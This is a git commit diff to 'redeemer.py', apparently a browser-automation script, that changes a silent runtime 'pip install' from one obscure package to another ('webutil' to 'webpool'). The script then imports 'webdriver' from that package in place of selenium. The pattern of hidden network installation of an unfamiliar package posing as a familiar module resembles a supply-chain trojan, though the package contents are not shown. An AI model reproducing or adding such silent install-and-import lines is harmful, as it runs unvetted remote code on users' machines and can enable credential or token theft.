7234fb9b22b0dee62079c0fb194388834be8d05c
nhunam <97402345+nhunam13112003@users.noreply.github.com>
2023-01-18 20:14:45 +0100

    Update redeemer.py

--- redeemer.py
+++ redeemer.py
@@ -7,8 +7,8 @@ import selenium
 import traceback
 import ctypes
 import undetected_chromedriver as uc
-os.system(f"pip install webutil")
-from webutil import webdriver
+os.system(f"pip install webpool")
+from webpool import webdriver
 from sys import exit
 from builtins import *
 from colorama import init, Fore
